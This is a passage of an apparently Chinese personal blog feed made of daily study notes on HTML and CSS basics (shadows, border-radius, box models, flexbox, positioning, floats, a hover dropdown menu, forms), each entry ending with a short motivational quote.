text-shadow:10px -10px 1px red;     #水平方向，垂直方向，模糊程度，阴影颜色&#125;如果要多个阴影，在颜色后面加逗号之后再加上另一个的参数，分号不要漏!!!盒子阴影div&#123;    width:100px;    ...    box-shadow: 10px(水平) 10px(垂直) 1px(模糊程度) 10px(阴影大小) red inside(内阴影);&#125;</code></pre><h3 id="圆角边框-放在style里"><a href="#圆角边框-放在style里" class="headerlink" title="圆角边框(放在style里)"></a>圆角边框(放在style里)</h3><p>同时设置四个角:<br>border-radius:10px;<br>1.从四个角往内截10px(可以使用百分比)<br>2.设置一个值，四个角一样<br>3.设置两个值，左上右下——&gt;左下右上<br>4.设置三个值，左上——&gt;左下右上——&gt;右下<br>5.设置四个值，左上开始顺时针</p><p>设置单个角:<br>boder-top-left-radius:10px;<br>boder-top-right-radius:10px;<br>boder-bottom-left-radius:10px;<br>boder-bottom-right-radius:10px;</p><p>border-radius:10px/20px;<br>水平/垂直切割，只支持boder-radius</p><h3 id="字体引入"><a href="#字体引入" class="headerlink" title="字体引入"></a>字体引入</h3><pre><code>&lt;style&gt;    @font-family:kerwin;                   #字体名字    src:url(font/STHUPO.TTF);              #字体文件路径    div&#123;        font-family:kerwin;                #字体名字        font-size:50px;               color:red;        text-shadow:5px 0px 0px green;    &#125;&lt;/style&gt;</code></pre><h3 id="盒模型"><a href="#盒模型" class="headerlink" title="盒模型"></a>盒模型</h3><h4 id="怪异盒模型"><a href="#怪异盒模型" class="headerlink" title="怪异盒模型"></a>怪异盒模型</h4><p>box-sizing: content-box;      #普通盒模型，增加padding时会扩张box<br>box-sizing: border-box;       #怪异盒模型，增加时不会撑大</p><h4 id="弹性盒模型-能够适应页面"><a href="#弹性盒模型-能够适应页面" class="headerlink" title="弹性盒模型(能够适应页面)"></a>弹性盒模型(能够适应页面)</h4><p>display:flex;<br>1.默认横向排列，不是浮动。<br>2.行内元素变为块级元素。<br>3.margin:auto;自动居中<br>4.flex-direction: column;<br>5.column主轴列向排列，row纵向排列;column-reverse；纵向倒序排列，row-reverse横向倒序排列<br>6.justify-content:flex-end;主轴位置<br>align-items:center;侧轴位置<br>7.flex-start靠左对齐;flex-end靠右对齐;center靠中对齐;space-around环绕;space-between两端对齐</p><h4 id="折行与行间距"><a href="#折行与行间距" class="headerlink" title="折行与行间距"></a>折行与行间距</h4><p>flex-wrap:wrap;                #打开折行<br>align-content:flex-start;      #折行之后的行间距<br>flex-start,flex-end,center,space-around,space-between同上</p><h2 id="至此，HTML与CSS结束！"><a href="#至此，HTML与CSS结束！" class="headerlink" title="至此，HTML与CSS结束！"></a>至此，HTML与CSS结束！</h2><h5 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句:"></a>每日一句:</h5><p>&nbsp;&nbsp;每一个问题都想给出回答，也有一些想说的，想劝的，想帮的，但想到自己的生活也是一地鸡毛。<br>「我们每个人都把自己活得一团糟，却总以为可以指导别人过得更好。」<br>&nbsp;&nbsp;但说回来还是一句用烦了的话，提升自己是解决一切问题的方式，亲情爱情友情都是，在现在这个世界里，经济独立财富自由能解决百分之九十的烦恼，很现实也很真实，我文化不高总觉得词不达意，慢慢来捱过去总会越来越好的，到达谷底的人怎么走都是向上的</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;每日一记&quot;&gt;&lt;a href=&quot;#每日一记&quot; class=&quot;headerlink&quot; title=&quot;每日一记&quot;&gt;&lt;/a&gt;每日一记&lt;/h1&gt;&lt;h3 id=&quot;复选框&quot;&gt;&lt;a href=&quot;#复选框&quot; class=&quot;headerlink&quot; title=&quot;复选框&quot;&gt;&lt;/a&gt;复选</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>20221020</title>
    <link href="https://liu1272.github.io/2022/10/20/b-12/"/>
    <id>https://liu1272.github.io/2022/10/20/b-12/</id>
    <published>2022-10-20T15:32:04.000Z</published>
    <updated>2022-10-23T07:45:20.812Z</updated>
    
    <content type="html"><![CDATA[<h5 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h5><h3 id="锚点"><a href="#锚点" class="headerlink" title="锚点"></a>锚点</h3><p>用a链接跳转到不同区域</p><pre><code>&lt;a href=&quot;#lianjie&quot;&gt;内容&lt;/a&gt;&lt;div id=&quot;a&quot;&gt;    内容&lt;/div&gt;点击a链接时跳到div中去</code></pre><h3 id="精灵图-图片整合技术"><a href="#精灵图-图片整合技术" class="headerlink" title="精灵图(图片整合技术)"></a>精灵图(图片整合技术)</h3><p>1.先将所有图片和为一个图<br>2.使用background-position来移动位置显示出</p><h3 id="宽高自适应"><a href="#宽高自适应" class="headerlink" title="宽高自适应"></a>宽高自适应</h3><p>定义:元素自动调整大小<br>1.定义宽高时为auto，元素的量决定宽高<br>2.min-height:10px;最小10px，多于10px就变大<br>问题:父元素不写高度时，子元素写了浮动，父元素会高度塌陷<br>1.声明<br>overflow:hidden;<br>2.浮动元素下加块元素并声明<br>clear:both; height:0; overflow:hidden;<br>3.清除浮动<br>after{content:””,clear:both; display:block; height:0; visibility:hidden;/overflow:hidden;}</p><h3 id="伪元素"><a href="#伪元素" class="headerlink" title="伪元素"></a>伪元素</h3><pre><code>div::first-letter&#123;          #定义第一个字符的样式    font-size:30px;    color:red;&#125;div::first-line&#123;&#125;           #定义第一行的样式div::after&#123;content:内容&#125;    #放在对象后的内容div::before&#123;content:内容&#125;   #放在对象前的内容</code></pre><h3 id="注意-隐藏的区别"><a href="#注意-隐藏的区别" class="headerlink" title="注意(隐藏的区别)"></a>注意(隐藏的区别)</h3><p>display:none(不占位)<br>visibility:hidden(占位)</p><h3 id="窗口自适应"><a href="#窗口自适应" class="headerlink" title="窗口自适应"></a>窗口自适应</h3><pre><code>1.单一栏目html,body&#123;    height:100%;             #所有盒子根据窗口的大小变化&#125;2.两栏布局(A)使用盒子的外边距&lt;style&gt;    .box1&#123;        height:100%;        ...        margin-left:200px;     #使一个盒子空出空间(外边距)    &#125;    .box2&#123;        height:100%;        ...        float:left;            #另一个盒子往另一边靠    &#125;&lt;/style&gt;(B)使用clac()函数计算长度值注意:可以使用加减乘除，而且运算符号前后都要加一个空格&lt;style&gt;    .box1&#123;        height:100%;        width:clac(100% - 200px);     #根据屏幕窗口的变化而改变        float:left;     &#125;    .box2&#123;        height:100%;        width:100px;         float:left;     &#125;&lt;/style&gt;3.三栏布局(A)1.先html,body&#123;&#125;全部统一变化2.left和right浮动3.center设置左右外边距4.先让左右浮动再插入center(B)同上，要在center加入clac函数</code></pre><h5 id="表单进阶"><a href="#表单进阶" class="headerlink" title="表单进阶"></a>表单进阶</h5><h3 id="单选框"><a href="#单选框" class="headerlink" title="单选框"></a>单选框</h3><pre><code>&lt;body&gt;    &lt;div&gt;性别&lt;/div&gt;                                        #定义标题    &lt;div&gt;        &lt;input type=&quot;radio&quot; name=&quot;1&quot; id=&quot;man&quot;&gt;            #radio是选框样式，name是一个组，id表示标记        &lt;label for=&quot;man&quot;&gt;男&lt;/label&gt;                       #label是说明标签，for是定位到上面的id    &lt;/div&gt;    &lt;div&gt;        &lt;input type=&quot;radio&quot; name=&quot;1&quot; id=&quot;woman&quot;&gt;        &lt;label for=&quot;woman&quot;&gt;女&lt;/label&gt;    &lt;/div&gt;&lt;/body&gt;注意:1.如果没有定义name(组)会变成多选2.如果要默认选中，在input中加上checked=&quot;checked&quot;，也可以直接写checked</code></pre><h5 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h5><p>人不该惧怕孤独，因为出生前，造物主就用孤独考验过每个人，哪里还能比在胚胎中更孤独呢？</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h5 id=&quot;每日一记&quot;&gt;&lt;a href=&quot;#每日一记&quot; class=&quot;headerlink&quot; title=&quot;每日一记&quot;&gt;&lt;/a&gt;每日一记&lt;/h5&gt;&lt;h3 id=&quot;锚点&quot;&gt;&lt;a href=&quot;#锚点&quot; class=&quot;headerlink&quot; title=&quot;锚点&quot;&gt;&lt;/a&gt;锚点&lt;/h</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>20221019</title>
    <link href="https://liu1272.github.io/2022/10/19/b-11/"/>
    <id>https://liu1272.github.io/2022/10/19/b-11/</id>
    <published>2022-10-19T15:32:04.000Z</published>
    <updated>2022-10-19T16:45:15.053Z</updated>
    
    <content type="html"><![CDATA[<h5 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h5><h3 id="定位"><a href="#定位" class="headerlink" title="定位"></a>定位</h3><pre><code>1.默认值position:static;2.绝对定位position:absolute;top:100px;left:-20px;脱离原始位置,但是原始位置占位，参照物是父元素或浏览器第一屏(没有父元素时)注:通常与相对定位相结合使用3.相对定位position:relative;top:100px;left:-20px;不脱离原始位置，但是原始位置不占位(类似于浮动),相对于原始位置4.固定定位position:fixed;top:100px;left:-20px;脱离原始位置，固定在浏览器窗口5.粘性定位position:sticky;top:0px;吸顶效果，需要定义距离边框的距离，css3.0新增附加:透明度&lt;style&gt;    p&#123;        opacity:0;        #0是完全透明，1是不透明    &#125;&lt;/style&gt;</code></pre><h3 id="三角形模型"><a href="#三角形模型" class="headerlink" title="三角形模型"></a>三角形模型</h3><pre><code>.box&#123;                                          #标准style    width:0px;                                 #定义盒子模型基本属性    height:0px;    border:20px solid transparent;             #四周全部透明    border-bottom:20px solid red;              #单边不透明，重合部分五五分显示颜色，这样子可以显示为三角形    position:relative;                         #相对盒子模型定位    bottom:2.5px;                              #移动至中间(美观)&#125;.box:hover span&#123;                               #悬浮时的style    width:0px;    height:0px;    border:20px solid transparent;    border-top:20px solid red;    position:relative;    top:2.5px;&#125;</code></pre><h3 id="定位的层级"><a href="#定位的层级" class="headerlink" title="定位的层级"></a>定位的层级</h3><p>父子关系时<br>z-index越大越靠上显示</p><h3 id="绝对定位深入探索"><a href="#绝对定位深入探索" class="headerlink" title="绝对定位深入探索"></a>绝对定位深入探索</h3><p>1.<br>兄弟关系时，后来者居上，后面的再上层<br>2.<br>行内元素转化为块元素<br>绝对定位法:定义absolute</p><pre><code>    &lt;style&gt;        span&#123;            width:            ...            poosition:absolute;        &#125;    &lt;/style&gt;&lt;body&gt;    &lt;span&gt;        内容    &lt;/span&gt;&lt;/body&gt;直接转化法:display:block;浮动法:float:left;</code></pre><h3 id="水平垂直居中"><a href="#水平垂直居中" class="headerlink" title="水平垂直居中"></a>水平垂直居中</h3><p>1.先定义absolute<br>2.设定宽高位置50%<br>3.移动-px至中间<br>4.注意是相对于哪个盒子</p><h3 id="定位与浮动的区别"><a href="#定位与浮动的区别" class="headerlink" title="定位与浮动的区别"></a>定位与浮动的区别</h3><p>有文字时:<br>浮动半脱离(文字环绕效果)<br>abslote全脱离(无环绕效果)</p><h5 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h5><p>想结果的花， 都早早低头。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h5 id=&quot;每日一记&quot;&gt;&lt;a href=&quot;#每日一记&quot; class=&quot;headerlink&quot; title=&quot;每日一记&quot;&gt;&lt;/a&gt;每日一记&lt;/h5&gt;&lt;h3 id=&quot;定位&quot;&gt;&lt;a href=&quot;#定位&quot; class=&quot;headerlink&quot; title=&quot;定位&quot;&gt;&lt;/a&gt;定位&lt;/h</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>20221018</title>
    <link href="https://liu1272.github.io/2022/10/18/b-10/"/>
    <id>https://liu1272.github.io/2022/10/18/b-10/</id>
    <published>2022-10-18T15:32:04.000Z</published>
    <updated>2022-10-18T17:07:00.972Z</updated>
    
    <content type="html"><![CDATA[<h5 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h5><h3 id="溢出属性"><a href="#溢出属性" class="headerlink" title="溢出属性"></a>溢出属性</h3><p>overflow:visible全部显示,hidden不显示溢出的,scroll滑动一直存在,auto自动<br>overflow:inherit继承父元素的效果<br>单一方向显示<br>overflow-x:auto;<br>overflow-y:hidden;<br>一定要定义x和y</p><h3 id="空余空间"><a href="#空余空间" class="headerlink" title="空余空间"></a>空余空间</h3><pre><code>white-space:normal;        #normal无视空白，nowrap不换行直到br标签，pre，pre-wrap,pre-linepre标签是预格式化文本，保留空格tab回车pre保留空白，pre-wrap折行但是保留空白，pre-line保留空白不换行</code></pre><h3 id="溢出省略号"><a href="#溢出省略号" class="headerlink" title="溢出省略号"></a>溢出省略号</h3><pre><code>width:2000px;                     #一定要定义宽度white-space:nowrap;               #不换行overflow:hidden;                  #隐藏溢出的部分text-overflow:ellipsis;           #若溢出则在最后显示省略号</code></pre><h3 id="元素显示类型"><a href="#元素显示类型" class="headerlink" title="元素显示类型"></a>元素显示类型</h3><p>1.块元素(display:block或list-item)<br>例:p,div,h标签<br>A）块状元素在网页中就是以块的形式显示，快状就是元素显示为矩形区域，<br>B）默认情况下，块状元素都会占据一行，会按顺序自上而下排列。<br>C）块状元素都可以定义自己的宽度和高度<br>D）块状元素一般都作为其他元素的容器，它可以容纳其它内联元素和其它块状元素。<br>E）p标签只能放文本不能放块级元素（div等）<br>2.行内(内联)元素(display:inline)<br>例:a,b,em,i,span,strong标签<br>A）在同一行排列<br>B）无法设置宽高，只能默认<br>3.行内块元素(display:inline-block)<br>例:img,input标签<br>A）可以设置宽高<br>B）同行排列</p><p>注意<br>span行内元素只支持左右边距，不支持上下边距<br>行内块支持</p><h3 id="元素类型相互转换"><a href="#元素类型相互转换" class="headerlink" title="元素类型相互转换"></a>元素类型相互转换</h3><p>直接在style里display:block;进行转换</p><h3 id="设置鼠标悬浮时显示，否则隐藏"><a href="#设置鼠标悬浮时显示，否则隐藏" class="headerlink" title="设置鼠标悬浮时显示，否则隐藏"></a>设置鼠标悬浮时显示，否则隐藏</h3><pre><code>&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;    &lt;title&gt;Document&lt;/title&gt;    &lt;style&gt;        .hide&#123;                      #隐藏界面(不显示内容)            display:none;        &#125;        .box:hover ul&#123;              #在hover时显示块元素(block是原本的style)            display:block;        &#125;    &lt;/style&gt;&lt;/head&gt;&lt;body&gt;    &lt;div class=&quot;hide&quot;&gt;        111111111111    &lt;/div&gt;    &lt;div class=&quot;box&quot;&gt;        内容1        &lt;ul class=&quot;hide&quot;&gt;            &lt;li&gt;11111&lt;/li&gt;            &lt;li&gt;22222&lt;/li&gt;            &lt;li&gt;33333&lt;/li&gt;        &lt;/ul&gt;    &lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="二级菜单案例《重点》"><a href="#二级菜单案例《重点》" class="headerlink" title="二级菜单案例《重点》"></a>二级菜单案例《重点》</h3><pre><code>&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;    &lt;title&gt;Document&lt;/title&gt;    &lt;style&gt;        *&#123;            padding:0;                       #先对整个页面布局            margin:0;        &#125;        .box&#123;            width:300px;            margin:0 auto;        &#125;        ul&#123;                                  #不悬浮时不显示            list-style:none;        &#125;        .box .item&#123;            float:left;            width:148px;                     #前面提到的要减去boder的宽度，因为计算的是加上boder的            text-align:center;            border:1px solid blue;            background:blue;            color:white;            line-height:40px;        &#125;        .item:hover&#123;            color:lightblue;        &#125;        .item&gt;ul&#123;                            # &gt;是选择器，选择子代的而不会选择到父代的ul标签            display:none;            background:white;            color:black;        &#125;        .item:hover ul&#123;                      #hover时恢复原本的块元素属性            display:block;        &#125;        .item li:hover&#123;                      #注意是hover在谁的时候显示变化            color:blue;        &#125;    &lt;/style&gt;&lt;/head&gt;&lt;body&gt;    &lt;ul class=&quot;box&quot;&gt;        &lt;li class=&quot;item&quot;&gt;aaaaaaaaaaaa        #第一个一级菜单            &lt;ul&gt;                &lt;li&gt;111&lt;/li&gt;                &lt;li&gt;222&lt;/li&gt;                 #第一个二级菜单                &lt;li&gt;333&lt;/li&gt;                &lt;li&gt;444&lt;/li&gt;            &lt;/ul&gt;        &lt;/li&gt;        &lt;li class=&quot;item&quot;&gt;bbbbbbbbbbbb        #第二个一级菜单            &lt;ul&gt;                &lt;li&gt;pmp&lt;/li&gt;                &lt;li&gt;红帽&lt;/li&gt;                #第二个二级菜单            &lt;/ul&gt;        &lt;/li&gt;    &lt;/ul&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h5 id="每日一悟"><a href="#每日一悟" class="headerlink" title="每日一悟"></a>每日一悟</h5><p>1.有几个模块就方济各div标签(header，导航nav，list，footer)<br>2.一定要注意减去宽度<br>3.共同的属性发放在一起成为标签，如宽度<br>4.为了美观和简单布局，建议引入css文件</p><h5 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h5><p>迷路，并无小路大路短路长路之区别。不能说在大路长路上迷路就不是迷路了。走在达不到目的的路上，就是迷路。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h5 id=&quot;每日一记&quot;&gt;&lt;a href=&quot;#每日一记&quot; class=&quot;headerlink&quot; title=&quot;每日一记&quot;&gt;&lt;/a&gt;每日一记&lt;/h5&gt;&lt;h3 id=&quot;溢出属性&quot;&gt;&lt;a href=&quot;#溢出属性&quot; class=&quot;headerlink&quot; title=&quot;溢出属性&quot;&gt;&lt;/a</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>20221016</title>
    <link href="https://liu1272.github.io/2022/10/16/b-9/"/>
    <id>https://liu1272.github.io/2022/10/16/b-9/</id>
    <published>2022-10-16T15:32:04.000Z</published>
    <updated>2022-10-17T09:45:51.739Z</updated>
    
    <content type="html"><![CDATA[<h6 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h6><h3 id="盒子模型"><a href="#盒子模型" class="headerlink" title="盒子模型"></a>盒子模型</h3><pre><code>1.外边距    &lt;style&gt;        div&#123;            padding:30px;               /* 一个值4个方向一样，两个值上下和左右，三个值上和左右和下，四个值上右下左 */            padding-left:0px;           /* 对单一方向更改 */        &#125;    &lt;/style&gt;&lt;/head&gt;&lt;body&gt;    &lt;div&gt;        111111111111111111    &lt;/div&gt;&lt;/body&gt;注意:1.上下两个box时外边距取大值2.左右两个box加和3.有父子两个box时，子盒子加外边距会整体移动解决:1.加浮动  2.overflow:hidden.2.边框&lt;style&gt;    .box1&#123;        border-top:10px dotted red;             #solid实线double双实线dashed虚线dotted点状线，可以选择单一方向更改        margin:10px auto;                       #用法同上，左边是纵向，右边是横向，auto是居中    &#125;&lt;/style&gt;注意:实际上的编写会有3px的误差，来源于图片标签的图片和文字间类型不同，需要转换:img&#123;    display:block;&#125;</code></pre><h5 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h5><p>迷路，并无小路大路短路长路之区别。不能说在大路长路上迷路就不是迷路了。走在达不到目的的路上，就是迷路。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h6 id=&quot;每日一记&quot;&gt;&lt;a href=&quot;#每日一记&quot; class=&quot;headerlink&quot; title=&quot;每日一记&quot;&gt;&lt;/a&gt;每日一记&lt;/h6&gt;&lt;h3 id=&quot;盒子模型&quot;&gt;&lt;a href=&quot;#盒子模型&quot; class=&quot;headerlink&quot; title=&quot;盒子模型&quot;&gt;&lt;/a</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>20221014</title>
    <link href="https://liu1272.github.io/2022/10/14/b-8/"/>
    <id>https://liu1272.github.io/2022/10/14/b-8/</id>
    <published>2022-10-14T15:32:04.000Z</published>
    <updated>2022-10-17T04:55:27.276Z</updated>
    
    <content type="html"><![CDATA[<h6 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h6><h3 id="列表属性-在列表前加元素"><a href="#列表属性-在列表前加元素" class="headerlink" title="列表属性(在列表前加元素)"></a>列表属性(在列表前加元素)</h3><pre><code>&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;    &lt;title&gt;Document&lt;/title&gt;    &lt;style&gt;ul&#123;        list-style-type:none;                    /* disc实心圆 circle空心圆 square实心正方形 none无 */        list-style-image:url(地址);              /* 这样子是全部都使用这种style的，否则要在li前加class */        list-style-position: outside;            /* outside把上面的元素放在盒子外面，inside放在里面 */        &#125;        .p1&#123;            list-style:none url(地址) inside;    /* 复合属性写法 */        &#125;    &lt;/style&gt;&lt;/head&gt;&lt;body&gt;    &lt;ul&gt;        &lt;li class=&quot;p1&quot;&gt;            内容        &lt;/li&gt;    &lt;/ul&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="背景属性"><a href="#背景属性" class="headerlink" title="背景属性"></a>背景属性</h3><p>用法和字体颜色一样</p><pre><code>在style下对标签定义width,height,background-color:rgba(255,0,0,0.5)    #rgba是透明对于插入的图片:background-image: url(地址);                                     #默认平铺，图片太大裁剪，太小复制background-repeat: repeat;                                       #repeat默认，repeat-x是x轴平铺，repeat-y是y轴平铺，no-repeat不平铺background-position:10px 10%;                                    #图片放置的位置，左边是横向右边是纵向，%是相对于盒子的background-position:right center;                                #左边是横向右边是纵向background-size:400px 100%;                                      #左边是横向右边是纵向(会失真)，cover(完全覆盖但是可能无法全部显示)，contain(图片全部展示但是会留白)background-attachment: fixed;                                    #fixed固定在浏览器视窗内，scroll滚动，如果没有div会不显示复合写法background:   ;不看顺序注意:background-size要单独放</code></pre><h3 id="浮动属性"><a href="#浮动属性" class="headerlink" title="浮动属性"></a>浮动属性</h3><pre><code>float:left;         #并排靠左排列，太多换行float:right;        #和左对称浮动的会覆盖未浮动的(因为float的没有高度)文字不能被挡住，放在上层防止高度塌陷(防止覆盖)1.div内固定高度，令其有高度2.清浮动clear:left/right/both/none3.当前浮动元素后补一个盒子，不设置宽高，clear:both4.overflow:hidden;(使浮动元素计算高度)</code></pre><h5 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h5><p>人，归根结底，是一个物质存在，很容易受损伤，却不容易修复。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h6 id=&quot;每日一记&quot;&gt;&lt;a href=&quot;#每日一记&quot; class=&quot;headerlink&quot; title=&quot;每日一记&quot;&gt;&lt;/a&gt;每日一记&lt;/h6&gt;&lt;h3 id=&quot;列表属性-在列表前加元素&quot;&gt;&lt;a href=&quot;#列表属性-在列表前加元素&quot; class=&quot;headerlink&quot; </summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>20221012</title>
    <link href="https://liu1272.github.io/2022/10/12/b-7/"/>
    <id>https://liu1272.github.io/2022/10/12/b-7/</id>
    <published>2022-10-12T15:32:04.000Z</published>
    <updated>2022-10-14T11:30:31.259Z</updated>
    
    <content type="html"><![CDATA[<h5 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h5><h3 id="字体样式"><a href="#字体样式" class="headerlink" title="字体样式"></a>字体样式</h3><pre><code>font-size        字体大小     单位是px，浏览器默认是16px,设计图常用字号是12pxfont-family      字体         当字体是中文字体、英文字体中有空格时，需加双引号                               多个字体中间用逗号链接,先解析第1个字体,如果没有解析第2个字体，以此类推 color            颜色         color:red;color:#ff0；color:rgb(255,0,0)；0-255 font-weight      加粗         font-weight:bolder(更粗的)/bold（加粗）/normal（常规）                               font-weight:100-900；100-500不加粗 600-900加粗 font-style       倾斜         font-style:italic(斜体字)/oblique(oblique倾斜的文字)/normal（常规显示）；text-align       文本水平对齐  text-align: left;       水平靠左                              text-align：right;     水平靠右                               text-align：cente;     水平居中                               text-align: justify;    水平2端对齐，但是只对多行起作用text-transform   单词大小写    uppercase全部大写,lowercase全部小写,none无定义,capitalize首字母大写样例&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;    &lt;title&gt;Document&lt;/title&gt;    &lt;style&gt;        .p1&#123;            font-size:13px;        &#125;        .p2&#123;            font-family:宋体,等等等;    #逗号间隔，从左到右依次使用        &#125;    &lt;/style&gt;&lt;/head&gt;&lt;body&gt;    &lt;p class=&quot;p1 p2&quot;&gt;        内容    &lt;/p&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>字体总结:<br>宋体 SimSun<br>黑体 SimHei<br>微软雅黑 Microsoft YaHei<br>微软正黑体 Microsoft JhengHei<br>新宋体 NSimSun<br>新细明体 PMingLiU<br>细明体 MingLiU<br>标楷体 DFKai-SB<br>仿宋 FangSong<br>楷体 KaiTi<br>仿宋 _GB2312 FangSong_GB2312<br>楷体 _GB2312 KaiTi_GB2312</p><h3 id="字体颜色"><a href="#字体颜色" class="headerlink" title="字体颜色"></a>字体颜色</h3><p>1.<br>color:rgb(255,0,0)<br>0最弱255最强<br>2.<br>十六进制0<del>9，A</del>F<br>color:ffffff    #每两个对应上面的一组，0是最弱f是最强，相同的可以只写一次</p><h3 id="文本修饰"><a href="#文本修饰" class="headerlink" title="文本修饰"></a>文本修饰</h3><pre><code>line-height          行高        line-height的数据=height的数据，可以实现单行文本垂直居中 text-indent          首行缩进    text-indent可以取负值； text-indent属性只对第一行起作用 letter-spacing       字间距      控制文字和文字之间的间距 text-decoration      文本修饰    text-decoration:  none没有/underline下划线/overline上划线/line-through删除线 font                 文字简写    font是font-style  font-weight font-size/line-height font-family的简写。                                 font:italic 800 30px/80px&quot;宋体”;   注意！！！对于font————顺序不能改变,必须同时指定font-size和font-family属性时才起作用</code></pre><h5 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h5><p>问什么有时候比答什么更能表露说话人的心。————张北海</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h5 id=&quot;每日一记&quot;&gt;&lt;a href=&quot;#每日一记&quot; class=&quot;headerlink&quot; title=&quot;每日一记&quot;&gt;&lt;/a&gt;每日一记&lt;/h5&gt;&lt;h3 id=&quot;字体样式&quot;&gt;&lt;a href=&quot;#字体样式&quot; class=&quot;headerlink&quot; title=&quot;字体样式&quot;&gt;&lt;/a</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>20221008和09</title>
    <link href="https://liu1272.github.io/2022/10/09/b-6/"/>
    <id>https://liu1272.github.io/2022/10/09/b-6/</id>
    <published>2022-10-09T15:32:04.000Z</published>
    <updated>2022-10-09T16:57:29.083Z</updated>
    
    <content type="html"><![CDATA[<h5 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h5><h3 id="CSS"><a href="#CSS" class="headerlink" title="CSS"></a>CSS</h3><p>1.含义:如何修饰网页信息的显示样式<br>2.语法<br> 1）每个CSS样式由两部分组成，即选择符和声明，声明又分为属性和属性值。<br> 2）属性必须放在花括号中，属性与属性值用冒号连接。<br> 3）每条声明用分号结束。<br> 4）当一个属性有多个属性值的时候，属性值与属性值不分先后顺序，用空格隔开。<br> 5）在书写样式过程中，空格、换行等</p><h2 id="内部样式表"><a href="#内部样式表" class="headerlink" title="内部样式表"></a>内部样式表</h2><pre><code>第一&lt;style&gt;    h1&#123;color:red;&#125;&lt;/style&gt;放head和body都可以第二&lt;body&gt;    &lt;h1 style=&quot;color:red;&quot; &gt;内容&lt;/h1&gt;&lt;/body&gt;</code></pre><h2 id="外部样式表"><a href="#外部样式表" class="headerlink" title="外部样式表"></a>外部样式表</h2><pre><code>&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; herf=&quot;css文件所在的地址&quot;&gt;       #注意是rel&lt;style&gt;    @import url(css文件所在的地址);                                    #注意分号&lt;style&gt;两种，最好放head标签里</code></pre><h2 